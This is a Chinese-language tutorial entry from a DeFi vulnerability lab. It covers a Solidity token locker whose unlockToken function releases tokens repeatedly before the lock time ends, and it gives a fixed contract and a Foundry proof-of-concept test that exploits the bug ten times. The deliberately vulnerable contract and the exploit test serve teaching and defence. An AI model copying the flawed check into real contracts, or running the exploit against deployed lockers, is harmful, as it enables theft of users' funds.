[Incorrect_sanity_checks.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Incorrect_sanity_checks.sol)

**名称**：错误的健全性检查 - 锁定时间结束前多次解锁

**描述**：该错误在于unlockToken函数，该函数缺少确保block.timestamp大于locktime的检查。 使得代币可以在锁定期结束之前多次解锁，这可能会导致重大的财务损失。

**解决办法**：

添加一个 require 语句来检查当前时间是否大于锁定时间，然后才能解锁tokens。

或修复：

```
uint256 amount = locker.amount;
if (block.timestamp > locker.lockTime) {
IERC20(locker.tokenAddress).transfer(msg.sender, amount);
locker.amount = 0;
}
```

**参考**: https://twitter.com/1nf0s3cpt/status/1681492477281468420

https://blog.decurity.io/dx-protocol-vulnerability-disclosure-bddff88aeb1d

**漏洞合约:**

```
contract VulnerableBank {
    struct Locker {
        bool hasLockedTokens;
        uint256 amount;
        uint256 lockTime;
        address tokenAddress;
    }

    mapping(address => mapping(uint256 => Locker)) private _unlockToken;
    uint256 private _nextLockerId = 1;

    function createLocker(
        address tokenAddress,
        uint256 amount,
        uint256 lockTime
    ) public {
        require(amount > 0, "Amount must be greater than 0");
        require(lockTime > block.timestamp, "Lock time must be in the future");
        require(
            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,
            "Insufficient token balance"
        );

        // 将代币转移到该合约中
        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);

        // 创建储物柜
        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];
        locker.hasLockedTokens = true;
        locker.amount = amount;
        locker.lockTime = lockTime;
        locker.tokenAddress = tokenAddress;

        _nextLockerId++;
    }

    function unlockToken(uint256 lockerId) public {
        Locker storage locker = _unlockToken[msg.sender][lockerId];
        // 将金额保存到局部变量
        uint256 amount = locker.amount;
        require(locker.hasLockedTokens, "No locked tokens");

        // 健全性检查不正确。
        if (block.timestamp > locker.lockTime) {
            locker.amount = 0;
        }

        // 将代币转移给储物柜所有者
         // 这就是漏洞利用发生的地方，因为它可以被多次调用
         // 在锁定时间过去之前。
        IERC20(locker.tokenAddress).transfer(msg.sender, amount);
    }
}
```

**修复合约:** 

```
contract FixedeBank {
    struct Locker {
        bool hasLockedTokens;
        uint256 amount;
        uint256 lockTime;
        address tokenAddress;
    }

    mapping(address => mapping(uint256 => Locker)) private _unlockToken;
    uint256 private _nextLockerId = 1;

    function createLocker(
        address tokenAddress,
        uint256 amount,
        uint256 lockTime
    ) public {
        require(amount > 0, "Amount must be greater than 0");
        require(lockTime > block.timestamp, "Lock time must be in the future");
        require(
            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,
            "Insufficient token balance"
        );

        // 将代币转移到该合约中
        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);

        // 创建储物柜
        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];
        locker.hasLockedTokens = true;
        locker.amount = amount;
        locker.lockTime = lockTime;
        locker.tokenAddress = tokenAddress;

        _nextLockerId++;
    }

    function unlockToken(uint256 lockerId) public {
        Locker storage locker = _unlockToken[msg.sender][lockerId];

        require(locker.hasLockedTokens, "No locked tokens");
        require(block.timestamp > locker.lockTime, "Tokens are still locked"); // Bug fixed
        // 将金额保存到局部变量
        uint256 amount = locker.amount;

        // 将令牌标记为解锁
        locker.hasLockedTokens = false;
        locker.amount = 0;

        //将代币转移给储物柜所有者
        IERC20(locker.tokenAddress).transfer(msg.sender, amount);
    }
}
```

***\*测试方法:\****

**forge test** --contracts src/test/Incorrect_sanity_checks.sol -vvvv

```
// 测试函数以演示 VulnerableBankContract 中的漏洞。
function testVulnerableBank() public {
    // 记录当前时间戳。
    console.log("Current timestamp", block.timestamp);

    // 通过虚拟机（vm）向“alice”发起“恶作剧”。
     // 从提供的代码片段来看，恶作剧函数的具体行为并不明显。
    vm.startPrank(alice);

    // 批准 VulnerableBankContract 代表“alice”从 BanksLPContract 花费 10000 个代币。
    BanksLPContract.approve(address(VulnerableBankContract), 10000);

    // 在创建储物柜之前记录“alice”的 BanksLPContract 余额。
    console.log(
        "Before locking, my BanksLP balance",
        BanksLPContract.balanceOf(address(alice))
    );

    // 在VulnerableBankContract中创建10000个代币的储物柜，锁定时长为86400秒（1天）。
    VulnerableBankContract.createLocker(
        address(BanksLPContract),
        10000,
        86400
    );

    // 在利用储物柜之前记录“alice”的 BanksLPContract 余额。
    console.log(
        "Before exploiting, my BanksLP balance",
        BanksLPContract.balanceOf(address(alice))
    );

    // 通过调用 'unlockToken' 函数 10 次来利用 VulnerableBankContract 中的锁柜。
     // 从提供的代码片段来看，所利用的确切漏洞并不明显。
    for (uint i = 0; i < 10; i++) {
        VulnerableBankContract.unlockToken(1);
    }

    // 利用储物柜后记录“alice”的 BanksLPContract 余额。
    console.log(
        "After exploiting, my BanksLP balance",
        BanksLPContract.balanceOf(address(alice))
    );
}
```

**红框**：在锁定期限结束前多次解锁。 紫色框：问题已修复。

![img](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F2a5f723a-59c1-40c1-95a8-2da1c9867ef1%2FUntitled.png?table=block&id=e7201e51-76b4-4575-a7e7-1ca2dc8d1fd3&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)

